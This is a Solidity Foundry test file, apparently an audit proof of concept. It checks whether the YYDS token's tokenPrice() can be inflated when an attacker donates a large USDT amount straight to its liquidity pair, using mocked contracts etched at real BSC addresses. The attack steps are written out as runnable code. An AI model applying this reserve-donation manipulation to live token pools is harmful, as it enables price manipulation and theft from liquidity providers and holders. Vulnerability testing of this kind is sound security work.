// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/YYDS.sol";

// Mock implementations
contract MockUSDT is ERC20 {
    constructor() ERC20("Mock USDT", "USDT") {
        _mint(msg.sender, 10000000 * 10**decimals());
    }
    
    function mint(address to, uint256 amount) public {
        _mint(to, amount);
    }
}

contract MockUniswapV2Factory {
    address public pair;
    
    constructor(address _pair) {
        pair = _pair;
    }
    
    function createPair(address, address) external view returns (address) {
        return pair;
    }
}

contract MockUniswapV2Router {
    address public immutable factory;
    
    constructor(address _factory) {
        factory = _factory;
    }
}

contract MockPair is ERC20 {
    address public token0;
    address public token1;
    
    constructor(address _token0, address _token1) ERC20("Mock Pair", "PAIR") {
        token0 = _token0;
        token1 = _token1;
    }
    
    function mint(address to, uint256 amount) public {
        _mint(to, amount);
    }
}

contract PriceManipulationTest is Test {
    YYDS token;
    
    // Real BSC addresses to be mocked
    address constant usdtAddress = 0x55d398326f99059fF775485246999027B3197955;
    address constant routerAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    
    // Test addresses
    address owner = makeAddr("owner");
    address marketing = makeAddr("marketing");
    address treasure = makeAddr("treasure");
    address shareholder = makeAddr("shareholder");
    address tokenOwner = makeAddr("tokenOwner");
    address attacker = makeAddr("attacker");
    
    function setUp() public {
        vm.startPrank(owner);
        
        // Deploy mock USDT and copy its code to fixed address
        MockUSDT mockUSDT = new MockUSDT();
        bytes memory usdtCode = address(mockUSDT).code;
        vm.etch(usdtAddress, usdtCode);
        
        // Deploy mock pair and factory
        MockPair pair = new MockPair(address(this), usdtAddress);
        MockUniswapV2Factory factory = new MockUniswapV2Factory(address(pair));
        MockUniswapV2Router router = new MockUniswapV2Router(address(factory));
        
        // Copy router code to fixed address
        bytes memory routerCode = address(router).code;
        vm.etch(routerAddress, routerCode);
        
        // Deploy the token contract
        token = new YYDS(
            marketing,
            treasure,
            shareholder,
            tokenOwner
        );
        
        // Mint initial tokens to tokenOwner
        MockUSDT(usdtAddress).mint(tokenOwner, 500000 * 10**18);
        token.transfer(tokenOwner, 5000 * 10**18);
        
        // Add liquidity
        vm.startPrank(tokenOwner);
        IERC20(usdtAddress).transfer(token.uniswapV2Pair(), 5000 * 10**18);
        token.transfer(token.uniswapV2Pair(), 5000 * 10**18);
        vm.stopPrank();
    }
    
    function test_token_price_manipulation() public {
        console.log("--- BEFORE-Trigger State ---");
        // Record initial token price and total supply
        uint initialPrice = token.tokenPrice();
        uint totalSupplyBefore = token.totalSupply();
        console.log("Initial token price:", initialPrice);
        console.log("Initial total supply:", totalSupplyBefore);
        
        // Verify initial price is reasonable
        assertGt(initialPrice, 0, "Initial price should be greater than zero");
        
        console.log("--- Trigger Price Manipulation ---");
        // Attacker manipulates the price
        vm.startPrank(attacker);
        
        // Create large amount of USDT for attacker
        MockUSDT(usdtAddress).mint(attacker, 500000 * 10**18);
        
        // Manipulate reserves by donating USDT to the pair
        IERC20(usdtAddress).transfer(token.uniswapV2Pair(), 500000 * 10**18);
        
        vm.stopPrank();
        
        console.log("--- AFTER-Trigger State ---");
        // Get manipulated price and total supply
        uint manipulatedPrice = token.tokenPrice();
        uint totalSupplyAfter = token.totalSupply();
        console.log("Token price after manipulation:", manipulatedPrice);
        console.log("Total supply after manipulation:", totalSupplyAfter);
        
        // Price comparison logic
        if (manipulatedPrice > initialPrice * 2 && totalSupplyBefore == totalSupplyAfter) {
            console.log("Vulnerability Exists: Token price doubled without supply change");
        } else if (totalSupplyBefore != totalSupplyAfter) {
            console.log("Vulnerability not Exist: Total supply changed unexpectedly");
        } else {
            console.log("Vulnerability not Exist: Price manipulation insufficient");
        }
    }
}